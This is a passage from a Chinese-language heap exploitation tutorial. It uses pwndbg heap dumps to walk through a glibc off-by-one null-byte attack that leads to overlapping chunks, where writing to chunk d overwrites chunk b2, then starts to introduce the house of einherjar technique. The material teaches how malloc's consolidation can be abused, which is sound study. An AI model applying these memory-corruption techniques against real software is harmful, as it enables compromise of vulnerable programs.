    0x80: 0x0
    unsortedbin
    all: 0x603110 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603110
    smallbins
    empty
    largebins
    empty
之后,程序将a[real_a_size]修改为了0x00,也就是将我们的b的size改为了0x200,(为了通过前文所说的check)此时的堆
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603110 {
      prev_size = 0,
      size = 512,
      fd = 0x7ffff7dd1b78 ,
      bk = 0x7ffff7dd1b78 ,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603310 {
      prev_size = 512,
      size = 0,
      fd = 0x210,
      bk = 0x110,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x603110 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603110
    smallbins
    empty
    largebins
    empty
可以看到,随着b的size被覆盖为了0x200,c的pre_size也变成了0x200
之后我们再次调用malloc的时候,因为b被视为为free态,此时会调用unlink
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603110 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x7ffff7dd1d68 ,
      bk = 0x7ffff7dd1d68 ,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603220 PREV_INUSE {
      prev_size = 0,
      size = 241,
      fd = 0x7ffff7dd1b78 ,
      bk = 0x7ffff7dd1b78 ,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603310 {
      prev_size = 240,
      size = 0,
      fd = 0x210,
      bk = 0x110,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x603220 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603220 /* ' 2`' */
    smallbins
    empty
    largebins
    empty
此时我们的b1已经被放到了原本b的位置
    pwndbg> p b1-0x10
    $15 = (uint8_t *) 0x603110 ""
    pwndbg> p b-0x10
    $17 = (uint8_t *) 0x603110 ""
    pwndbg>
然后系统又malloc了b2
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603110 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x7ffff7dd1d68 ,
      bk = 0x7ffff7dd1d68 ,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603220 PREV_INUSE {
      prev_size = 0,
      size = 145,
      fd = 0x7ffff7dd1b78 ,
      bk = 0x7ffff7dd1b78 ,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6032b0 FASTBIN {
      prev_size = 0,
      size = 97,
      fd = 0x7ffff7dd1b78 ,
      bk = 0x7ffff7dd1b78 ,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603310 {
      prev_size = 96,
      size = 0,
      fd = 0x210,
      bk = 0x110,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> p b2-0x10
    $19 = (uint8_t *) 0x603220 ""
可以看到我们的b2也在原本b所在的位置上
随后我们释放b1和c,程序会直接无视b2合并b1和c,因为c的pre_size为
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603110 PREV_INUSE {
      prev_size = 0,
      size = 801,
      fd = 0x6032b0,
      bk = 0x7ffff7dd1b78 ,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603430 {
      prev_size = 800,
      size = 272,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603540 PREV_INUSE {
      prev_size = 0,
      size = 133825,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x603110 —▸ 0x6032b0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603110
    smallbins
    empty
    largebins
    empty
    pwndbg> x/10gx 0x603110
    0x603110:       0x0000000000000000      0x0000000000000321
    0x603120:       0x00000000006032b0      0x00007ffff7dd1b78
    0x603130:       0x0000000000000000      0x0000000000000000
    0x603140:       0x0000000000000000      0x0000000000000000
    0x603150:       0x0000000000000000      0x0000000000000000
    pwndbg>
可以看到程序将b1和c合并了,大小为0x321,此时我们申请d,就会导致d和b2的overlapping
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603110 PREV_INUSE {
      prev_size = 0,
      size = 801,
      fd = 0x7ffff7dd1e88 ,
      bk = 0x7ffff7dd1e88 ,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603430 PREV_INUSE {
      prev_size = 800,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603540 PREV_INUSE {
      prev_size = 0,
      size = 133825,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> p d-0x10
    $36 = (uint8_t *) 0x603110 ""
    pwndbg> p b2-0x10
    $37 = (uint8_t *) 0x603220 "2001"
此时b2的值为
    pwndbg> x/10gx b2-0x10
    0x603220:       0x0000000000000110      0x0000000000000090
    0x603230:       0x4242424242424242      0x4242424242424242
    0x603240:       0x4242424242424242      0x4242424242424242
    0x603250:       0x4242424242424242      0x4242424242424242
    0x603260:       0x4242424242424242      0x4242424242424242
然后我们给d赋值,之后b2的值变成了
    pwndbg> x/10gx b2-0x10
    0x603220:       0x4444444444444444      0x4444444444444444
    0x603230:       0x4444444444444444      0x4444444444444444
    0x603240:       0x4444444444444444      0x4444444444444444
    0x603250:       0x4444444444444444      0x4444444444444444
    0x603260:       0x4444444444444444      0x4444444444444444
可以看到我们的b2已经被修改了
###  总结
程序首先malloc了a(0x100),b(0x200),c(0x100),barrier(0x100)四个chunk
随后为了绕过check,程序将b+0x1f0的位置设为了0x200
紧接着程序Free掉了b并将b的size设为了0x200(原本是0x211)
随后程序malloc了b1(0x100),因为b是被Free掉的,因此b1就会被被放到b的部分,而b做了一个unlink,一分两半
随后程序又malloc了b2(0x80),b2依旧是所属b的
之后程序为了方便看效果,将b2填满了’B’
最后程序free掉了b1和c,因为c的pre_size为0x210,因此程序就会将b1和c合并,因为b2位于b1和c之间,虽然b2其实并未被free,但是我们已经可以申请到b2的内存了
此时程序malloc了d(0x300),系统就会把b1和c合并后的大chunk给用户,此时d就申请到了原本b开始到b+0x310结束的内存,将b2包了起来
构成了overlapping,此时给d赋值为”D”,可以看到b2也被覆盖成了”D” 🙂
## house of einherjar
###  序
这个利用技术由Hiroki
Matsukuma提出,具体内容可以看[链接](https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606)
这个技术也就是利用free的后向合并把top chunk设为我们伪造的chunk地址来强制malloc分配到我们伪造的地址
###  源代码
同样的,我这里删了一点作者的话并加了注释
作者的话:
感谢st4g3r公布这个技术
这个攻击技巧使用了off-by-one溢出漏洞，用一个 null字节来通过malloc控制指针